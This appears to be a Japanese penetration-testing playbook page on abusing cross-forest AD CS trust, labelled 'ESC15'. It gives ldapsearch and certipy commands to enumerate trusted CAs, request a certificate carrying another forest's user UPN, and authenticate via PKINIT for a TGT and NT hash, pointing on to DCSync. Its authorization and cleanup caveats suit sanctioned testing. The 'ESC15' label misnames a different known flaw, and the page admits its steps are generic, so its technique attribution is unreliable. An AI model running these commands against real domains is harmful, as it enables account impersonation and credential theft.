# ESC15 — Cross CA Enrollment + 信頼チェーン悪用

> **スコープ**: 複数の CA・クロスフォレスト PKI 信頼が存在する環境で、別の信頼された CA の脆弱テンプレートを悪用して別フォレストの KDC で PKINIT 認証する。ESC1〜ESC14 が一切使えない環境での最後の確認項目。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

- AD フォレストまたは別の PKI 階層に**複数の CA が存在する**（サブ CA・エンタープライズ CA・外部 CA）
- あるドメインの CA が発行した証明書を別のドメイン・フォレストの KDC が信頼している（クロスフォレスト PKI 信頼）
- 1 つの CA では ESC1〜ESC14 が悪用できなくても、別の信頼された CA のテンプレートが緩い設定を持っている

> **注意（ESC15 は構成依存が最も強く PoC はほぼ存在しない）**: クロス CA 信頼の悪用は環境の PKI 設計に完全依存する。本ファイルは「確認すべき観点」を中心に記述し、具体的な手順は一般論に留める。

## 環境前提
- 実行環境: テスター端末（複数フォレスト/ドメインへのネットワーク到達性があること）
- 必要なツール: `certipy`（`pip install certipy-ad`）/ `ldapsearch`（`NTAuthCertificates` 確認用）
- 前提知識: フォレスト間の信頼関係の種類（双方向・片方向・フォレスト信頼・外部信頼）の理解が必要

## 先に確認すること

**攻撃者の思考トレース:** AD は `NTAuthCertificates` に登録された CA の証明書のみを Kerberos 認証に使用できる。クロス CA の信頼関係がある環境では、フォレスト A の KDC が信頼する CA 証明書リストにフォレスト B の CA が含まれる場合があり、フォレスト B 側で脆弱なテンプレートを悪用した証明書がフォレスト A での PKINIT 認証に使えることがある。実環境での確認事例は非常に限定的。

---

## 1. 複数 CA・クロス信頼の有無を確認

**コマンド:**

```bash
# [Attacker] 現在のドメインの NTAuthCertificates に登録された CA を確認
ldapsearch -H ldap://[DC_IP] -x -D "[USER]@[DOMAIN]" -w "[PASSWORD]" \
  -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[DOMAIN_PART],DC=[DOMAIN_PART]" \
  "(objectClass=certificationAuthority)" cACertificate
# → 複数の CA 証明書が含まれていれば複数 CA 信頼が設定されている

# [Attacker] Certipy で CA 情報を列挙（複数ドメインの CA を確認）
certipy find -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -stdout
```

```powershell
# [Target] フォレスト/ドメイン信頼関係を確認
Get-ADTrust -Filter * | Select-Object Name,TrustType,TrustDirection,IntraForest
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `NTAuthCertificates` に複数の CA 証明書が含まれる | 信頼された各 CA の脆弱テンプレートを `certipy find` で確認する |
| フォレスト信頼が `TrustType: Forest` で双方向 | クロスフォレスト PKINIT の可能性あり。別フォレスト側の CA テンプレートも調査する |
| 別 CA のテンプレートが ESC1〜ESC8 に相当する設定を持つ | そのテンプレートに対して該当 ESC の手順を適用する |
| すべての CA のテンプレートに脆弱設定がない | ESC15 の悪用はほぼ不可。他の手法を確認する |

---

## 2. 信頼された各 CA のテンプレートを確認する

**コマンド:**

```bash
# [Attacker] フォレスト A の CA テンプレートを確認
certipy find -u [USER_A]@[DOMAIN_A] -p "[PASSWORD_A]" -dc-ip [DC_IP_A] -vulnerable -stdout

# [Attacker] フォレスト B の CA テンプレートを確認（アクセス権がある場合）
certipy find -u [USER_B]@[DOMAIN_B] -p "[PASSWORD_B]" -dc-ip [DC_IP_B] -vulnerable -stdout
```

---

## 3. 脆弱テンプレートを持つ CA で証明書を申請〜クロスフォレスト PKINIT

発見された ESC の種別に応じて、対応する ESC ファイルの手順を適用する。

**事前準備（必須）:** 各 DC との時刻同期（`sudo ntpdate -u [DC_IP_FOREST_A]` 等）。

**コマンド:**

```bash
# [Attacker] 脆弱テンプレートを持つ CA（フォレスト B）で証明書を申請
certipy req \
  -ca [CA_NAME_B] -template [VULNERABLE_TEMPLATE_B] \
  -u [USER_B]@[DOMAIN_B] -p "[PASSWORD_B]" -dc-ip [DC_IP_B] \
  -upn [TARGET_UPN_FOREST_A]
# → フォレスト A のユーザー UPN を含む証明書を発行

# [Attacker] フォレスト B の CA が発行した証明書でフォレスト A に認証
certipy auth -pfx [TARGET_USERNAME].pfx -domain [DOMAIN_A] -dc-ip [DC_IP_A]
# → フォレスト A の KDC が証明書を受け入れるかどうかは NTAuthCertificates の設定次第
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| TGT + NT ハッシュが取得できる | クロスフォレスト PKINIT 成功 | DCSync → `../Credential_Dumping.md` |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | フォレスト A の `NTAuthCertificates` にフォレスト B の CA 証明書が含まれていない | PKINIT 信頼が確立していない |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| 各 CA のテンプレートに脆弱設定がない | ESC15 の悪用はほぼ不可能。各フォレストで独立して ESC1〜ESC14 を探索する |
| フォレスト B へのアクセスがない | フォレスト A で取得できる権限を使ってフォレスト B への経路を確認する（`Get-ADTrust` / BloodHound のフォレスト間エッジ）|

---

## 注意点・落とし穴

- **クロス CA 信頼の悪用は非常に稀**: 実環境で ESC15 に該当する PKI 設計は極めてまれ。他の ESC をすべて検討した上で最後の確認項目として扱う
- **`NTAuthCertificates` の変更は重大な操作**: DA 権限なしには実行できない（ESC5 参照）。また実行した場合の業務影響は甚大
- **BloodHound のフォレスト間エッジを確認する**: `DCFor`・`TrustedBy` などのエッジがフォレスト間の信頼を示す

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。複数フォレストに影響が及ぶため、各フォレストのオーナーとの合意が必要
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（各フォレストの CA）/ 4768（各フォレストの DC）/ フォレスト間の TGT 委任ログ / MDI アラート
- **業務影響リスク**: 証明書発行自体は業務影響なし。フォレスト間の認証操作はクロスフォレスト認証サービスへの影響の可能性
- **原状回復必須項目**: ✅ 発行した証明書を各 CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC5（`NTAuthCertificates` への Write 権限悪用）→ `ESC5.md`
- 前：各 ESC（1〜14）の個別手順 → 該当ファイルを参照
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
